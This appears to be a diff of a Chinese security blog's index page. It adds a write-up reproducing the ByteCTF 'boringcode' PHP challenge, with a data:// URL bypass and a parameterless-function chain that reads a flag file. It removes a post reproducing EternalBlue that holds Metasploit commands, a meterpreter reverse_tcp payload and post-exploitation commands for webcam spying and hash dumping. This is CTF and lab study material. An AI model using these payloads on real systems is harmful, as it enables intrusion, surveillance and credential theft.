@@ -207,6 +207,224 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5c8fc5c96.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d5c8fc5c96.html" class="post-title-link" itemprop="url">复现ByteCTF-boringcode</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-07 14:11:33" itemprop="dateCreated datePublished" datetime="2019-10-07T14:11:33+08:00">2019-10-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:15:55" itemprop="dateModified" datetime="2020-10-14T17:15:55+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛没做出来，看着大佬的write up复现，思路真的很骚。</p>
+<h2 id="Boringcode"><a href="#Boringcode" class="headerlink" title="Boringcode"></a>Boringcode</h2><ul>
+<li><strong>源码</strong></li>
+</ul>
+<pre><code class="php">&lt;?php
+function is_valid_url($url) {
+    if (filter_var($url, FILTER_VALIDATE_URL)) {
+        if (preg_match(&#39;/data:\/\//i&#39;, $url)) {
+            return false;
+        }
+        return true;
+    }
+    return false;
+}
+
+if (isset($_POST[&#39;url&#39;])){
+    $url = $_POST[&#39;url&#39;];
+    if (is_valid_url($url)) {
+        $r = parse_url($url);
+        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
+            $code = file_get_contents($url);
+            if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
+                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
+                    echo &#39;bye~&#39;;
+                } else {
+                    eval($code);
+                }
+            }
+        } else {
+            echo &quot;error: host not allowed&quot;;
+        }
+    } else {
+        echo &quot;error: invalid url&quot;;
+    }
+}else{
+    highlight_file(__FILE__);
+}</code></pre>
+<h3 id="考点1"><a href="#考点1" class="headerlink" title="考点1"></a>考点1</h3><pre><code class="php"> if (is_valid_url($url)) {
+        $r = parse_url($url);
+        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
+            $code = file_get_contents($url);</code></pre>
+<p>这里如果没有<code>is_valid_url($url)</code>是可以使用data伪协议进行绕过，但是<code>is_valid_url($url)</code>对data进行了过滤使用伪协议这条数行不通，但是也学到了data伪协议可以绕过域名的限制。,但是绕过该点要不一个baidu的鸡肋跳转漏洞要不就是买个xxxbaidu.com的域名。</p>
+<p>例如：</p>
+<pre><code class="php">&lt;?php
+$url = $_POST[&#39;url&#39;];
+$r = parse_url($url);
+if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
+            $code = file_get_contents($url);
+        }
+
+eval($code);
+?&gt;</code></pre>
+<p>payload:</p>
+<pre><code class="php">url=data://baidu.com/plain;base64,cGhwaW5mbygpOw==</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704299387377.png" alt="img"></p>
+<hr>
+<h3 id="考点2"><a href="#考点2" class="headerlink" title="考点2"></a>考点2</h3><pre><code class="php">if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
+                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
+                    echo &#39;bye~&#39;;
+                } else {
+                    eval($code);
+                }</code></pre>
+<p>这里会把函数给替换为空，如果替换结果剩下一个<code>“；”</code>那么就可以绕过这个正则。</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704330592656.png" alt="img"></p>
+<p>可以观察到，这个正则只会匹配函数为纯字母并且参数为空的payload。也就是说我们传入的值必须是一个只含字母并且没有参数的函数的payload.同时可以注意到这个是可以进行一个函数的套用。那就是说让我们构造多个空参数的函数去读取flag.</p>
+<p>我们看如下几个函数：</p>
+<pre><code class="php">scandir() 
+    var_dump(scandir(&#39;.&#39;));
+    array(3) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; } </code></pre>
+<p>了一看到<code>scandir(&#39;.&#39;)</code>能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用：</p>
+<pre><code class="php">end()//读取数组最后一个元素
+readfile()//输出一个文件</code></pre>
+<p>那么就可以构造如下payload:</p>
+<pre><code class="php">readfile(end(scandir(&#39;.&#39;)))</code></pre>
+<p>问题又来了，我们不不能够有这个参数那么点又如何构造呢？从大佬的write up中看到两个方法。</p>
+<ol>
+<li><pre><code class="php">localeconv()
+    var_dump(localeconv());
+    array(18) { 
+        [&quot;decimal_point&quot;]=&gt; string(1) &quot;.&quot; 
+        [&quot;thousands_sep&quot;]=&gt; string(0) &quot;&quot; 
+        [&quot;int_curr_symbol&quot;]=&gt; string(0) &quot;&quot;
+        [&quot;currency_symbol&quot;]=&gt; string(0) &quot;&quot; 
+        [&quot;mon_decimal_point&quot;]=&gt; string(0) &quot;&quot;
+        .......
+    } </code></pre>
+</li>
+</ol>
+<p>该函数返回一个当地数字以及货币信息的数组，可以看到返回值第一个就是<code>“.”</code>,而与end()相反的取第一个元素的函数有:</p>
+<pre><code class="php">current()       返回数组中的当前单元, 默认取第一个值
+pos()           current() 的别名</code></pre>
+<p>那么就可以构造如下payload.可以读取到文件本地文件。</p>
+<pre><code class="php">readfile(end(scandir(pos(localeconv()))))</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704367249781.png" alt="img"></p>
+<p>但是flag并不在本文件夹下，那么就需要用到改变当前目录的函数:</p>
+<pre><code class="php">chdir() 函数改变当前的目录。
+next() 函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的&quot;..&quot;</code></pre>
+<p>那么构造payload,j就可以跳转到上一目录了，大师chidr并不会返回目录列表,而是会返回一个bool值，我们怎么去读取文件呢:</p>
+<pre><code class="php">chdir(next(scandir(pos(localeconv()))))</code></pre>
+<p>这里可以使用if()语句，也就是当跳转目录成功时候就读取当前文件。构造如下payload:</p>
+<pre><code class="php">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))))</code></pre>
+<ol start="2">
+<li>当然还有另外的方法，利用当前秒数构造AIISC码再用<code>chr()</code>去转码生成字符。</li>
+</ol>
+<pre><code class="php">chr(pos(localtime()))</code></pre>
+<p>这里出现了一个问题，这个<code>localtime()</code>只接受时间戳，那么这里又出现了其问题如果构造如下payload将无法执行。那么这里还需要不受参数影响的函数，那就<code>time()</code></p>
+<pre><code class="php">chr(pos(localtime(chdir(next(scandir(pos(localeconv())))))))</code></pre>
+<p>那么可以构造如下payload:</p>
+<pre><code class="php">chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))</code></pre>
+<p>整体构造：</p>
+<pre><code class="php">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></pre>
+<h3 id="无参数函数小总结"><a href="#无参数函数小总结" class="headerlink" title="无参数函数小总结"></a>无参数函数小总结</h3><p>这里是针对无参数函数利用来说的。</p>
+<pre><code class="php">getchwd() 函数返回当前工作目录。
+scandir() 函数返回指定目录中的文件和目录的数组。
+dirname() 函数返回路径中的目录部分。
+chdir() 函数改变当前的目录。
+
+readfile()  输出一个文件
+
+current()       返回数组中的当前单元, 默认取第一个值
+pos()           current() 的别名
+next() 函数将内部指针指向数组中的下一个元素，并输出。
+end()       将内部指针指向数组中的最后一个元素，并输出。
+array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+
+chr() 函数从指定的 ASCII 值返回字符。
+hex2bin — 转换十六进制字符串为二进制字符串
+
+getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</code></pre>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a herf="https://xz.aliyun.com/t/6316#toc-9">ByteCTF一道题的分析与学习PHP无参数函数的利用</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5d15ec4e7.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1853,114 +2071,6 @@ username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%0
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d6d0747d1e.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d6d0747d1e.html" class="post-title-link" itemprop="url">永恒之蓝漏洞复现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-09-11 22:30:15" itemprop="dateCreated datePublished" datetime="2019-09-11T22:30:15+08:00">2019-09-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:08:45" itemprop="dateModified" datetime="2020-10-14T17:08:45+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞复现/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>547</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <pre><code>1.实验环境：（1）win7靶机一台（2）kail linux攻击机</code></pre><p>2.渗透前信息收集<br>（1）使用扫描器扫描内网打开445端口的计算机</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190911/15682097323968.png" alt="img"></p>
-<p>3.扫描存在漏洞的Ip</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190911/15682098226388.jpg" alt="img"></p>
-<pre><code>调用永恒之蓝：use exploit/windows/smb/ms17_010_eternalblue
-设置客户端IP：set rhost 10.**.**.7*
-设置payload:set payload windows/x64/meterpreter/reverse_tcp
-设置监听的IP：set lhost 10.*.*.*
-meterspoilt常用命令：
-摄像头：
-ecord_mic       --&gt;X秒从默认的麦克风record_mic音频记录（音频录制）
-webcam_chat      --&gt;开始视频聊天（视频，对方会有弹窗）
-webcam_list      --&gt;单摄像头（查看摄像头列表）
-webcam_snap      --&gt;采取快照从指定的摄像头（摄像头拍摄一张照片）
-webcam_stream    --&gt;播放视频流从指定的摄像头（开启摄像头监控）
-其他：
-getsystem        --&gt;获取高权限
-hashdump         --&gt;获取当前用户hash
-pwd              --&gt;查看工作目录
-screenshot       --&gt;截屏
-search -f *.doc  --&gt;搜索文件（doc）</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190911/15682098703131.png" alt="img"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2032,7 +2142,7 @@ search -f *.doc  --&gt;搜索文件（doc）</code></pre><p><img src="http://goo
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-count">75</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2103,12 +2213,12 @@ search -f *.doc  --&gt;搜索文件（doc）</code></pre><p><img src="http://goo
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">281k</span>
+    <span title="站点总字数">283k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:16</span>
+    <span title="站点阅读时长">4:17</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
